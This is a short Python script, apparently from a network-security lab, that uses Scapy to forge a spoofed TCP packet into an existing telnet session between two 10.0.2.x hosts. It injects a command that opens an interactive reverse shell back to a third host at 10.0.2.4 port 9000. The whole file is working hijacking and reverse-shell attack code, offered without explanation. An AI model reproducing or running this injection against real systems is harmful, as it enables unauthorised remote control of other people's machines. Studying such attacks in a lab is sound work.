from scapy.all import *
ip =IP(src="10.0.2.6", dst="10.0.2.5")
tcp=TCP(sport=45610,dport=23,flags="A",seq=3615478592,ack=3126396132)
data="\r /bin/bash -i > /dev/tcp/10.0.2.4/9000 0<&1 2>&1 \r"
pkt=ip/tcp/data
pkt.show()
send(pkt,verbose=0)